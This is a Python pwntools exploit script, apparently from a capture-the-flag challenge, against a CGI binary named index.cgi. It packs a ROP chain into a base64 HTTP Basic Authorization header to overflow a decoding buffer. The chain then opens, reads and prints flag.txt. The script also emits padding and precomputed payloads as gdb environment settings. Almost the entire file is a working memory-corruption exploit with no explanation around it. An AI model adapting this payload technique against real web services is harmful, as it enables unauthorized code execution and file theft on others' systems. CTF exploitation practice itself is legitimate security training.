#!/usr/bin/env python3

from pwn import *

import base64

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('index.cgi', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)


"""
pwndbg> inf b
Num     Type           Disp Enb Address            What
2       breakpoint     keep y   0x000000000040203b <(anonymous namespace)::decode_base64(char const*, char*)+26>
	breakpoint already hit 1 time
3       catchpoint     keep y                      exception throw
	catchpoint already hit 1 time
12      breakpoint     keep y   0x00000000004189af <_Unwind_RaiseException+463>
	breakpoint already hit 7 times
13      breakpoint     keep y   0x0000000000484767 <do_dlopen+55>
14      breakpoint     keep y   0x00000000004031c0 <__gxx_personality_v0>
	breakpoint already hit 6 times
15      breakpoint     keep y   0x0000000000407d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::reserve()+64>
16      breakpoint     keep y   0x0000000000418369 <_Unwind_RaiseException_Phase2+233>
	breakpoint already hit 7 times
17      breakpoint     keep y   0x0000000000407d7c <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::reserve()+172>
18      breakpoint     keep y   0x0000000000418b7d <_Unwind_RaiseException+925>
	breakpoint already hit 1 time


set environment REQUEST_METHOD GET
set environment HTTP_AUTHORIZATION Basic YWRtaW46Z3JleXtmYWtlX2ZsYWd9
b main
b validate_auth
b decode_base64
catch throw
run
"""

pop_rdi= 0x0000000000403265
pop_rsi = 0x0000000000405f45
pop_rdx_rbx = 0x484767
bss = 0x4c3280
b64 = flat(
    b'admin:',
    b'a'*(0x110-6),
    0x4c87c0, # rbp
    # 0x407d10, # real fake rip
    0x0000000000402296, # test
    b'b'*0x38,

    pop_rdi, 1, 
    pop_rsi, 0x48f0fb,
    pop_rdx_rbx, 25, 0,
    exe.sym.write,

    pop_rdi, 1, 
    pop_rsi, 0x48f113,
    pop_rdx_rbx, 1, 0,
    exe.sym.write,

    pop_rdi, 0x48f131,  # flag.txt string
    pop_rsi, 0,
    exe.sym.open,

    pop_rdi,
    3,
    pop_rsi,
    bss,
    pop_rdx_rbx, 0x30, 0,
    exe.sym.read,

    pop_rdi, 1,
    pop_rsi, bss,
    pop_rdx_rbx, 0x30, 0,
    exe.sym.write,

    pop_rdi, 0,
    exe.sym._exit

)

load = b'Basic ' + base64.b64encode(b64) + b'@AAA'

AI = b"Basic YWRtaW46QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHAh0wAAAAAABB9QAAAAAAAQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFlMkAAAAAAAAEAAAAAAAAARV9AAAAAAAD78EgAAAAAAGdHSAAAAAAAGQAAAAAAAAAAAAAAAAAAAMBYRQAAAAAAZTJAAAAAAAABAAAAAAAAAEVfQAAAAAAAE/FIAAAAAABnR0gAAAAAAAEAAAAAAAAAAAAAAAAAAADAWEUAAAAAAGUyQAAAAAAAMfFIAAAAAABFX0AAAAAAAAAAAAAAAAAA8FZFAAAAAABlMkAAAAAAAAMAAAAAAAAARV9AAAAAAADAf0wAAAAAAGdHSAAAAAAAgAAAAAAAAAAAAAAAAAAAACBYRQAAAAAAZTJAAAAAAAABAAAAAAAAAEVfQAAAAAAAwH9MAAAAAABnR0gAAAAAAIAAAAAAAAAAAAAAAAAAAADAWEUAAAAAAGUyQAAAAAAAAAAAAAAAAACATUUAAAAAAFBQ@AAA"

bof = b'Basic ' + base64.b64encode(b'a'*0x150) + b'@AAA'

# while len(load) % 3 or len(load) % 4:
#         load += b"P"
print('EXPLOIT:')
print((b'set environment HTTP_AUTHORIZATION ' + load).decode())


print('-'*0x50)
print('PAD:')
print((b'set environment HTTP_AUTHORIZATION ' + bof).decode())

print('-'*0x50)

print('AI:')
print((b'set environment HTTP_AUTHORIZATION ' + AI).decode())
